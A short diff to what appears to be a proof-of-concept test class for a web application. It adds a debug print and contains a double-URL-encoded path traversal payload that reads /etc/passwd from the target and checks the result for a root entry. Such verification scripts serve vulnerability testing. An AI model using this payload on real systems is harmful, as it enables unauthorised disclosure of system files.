@@ -32,6 +32,7 @@ class TestPOC(POCBase):
             base_url = base_url+":8888"
         payload = "{}/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development".format(self.url)
         req_result = req.get(payload).text
+        print(req_result)
         if "root:/root:/bin/ash" in req_result:
             print(req_result)
             result['VerifyInfo'] = "success"
